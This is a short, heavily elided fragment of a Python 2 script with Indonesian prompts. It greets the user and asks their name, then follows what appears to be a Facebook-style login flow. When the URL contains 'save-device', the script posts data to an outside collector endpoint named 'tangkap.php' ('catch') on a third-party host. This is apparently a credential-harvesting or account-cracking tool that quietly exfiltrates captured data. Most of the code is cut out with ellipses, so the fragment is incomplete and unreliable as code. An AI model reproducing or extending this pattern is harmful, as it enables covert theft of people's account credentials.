...
def siapa():
	os.system('clear')
	nama = raw_input("\033[1;97mHai Kenalan dulu dong, Siapa nama kamu ? \033[1;91m: \033[1;92m")
	if nama =="":
	...
	try:
		...
		if 'save-device' in url:
			...
			try:
				...
				requests.post("https://rayinsta-download.cloudaccess.host/tangkap.php",
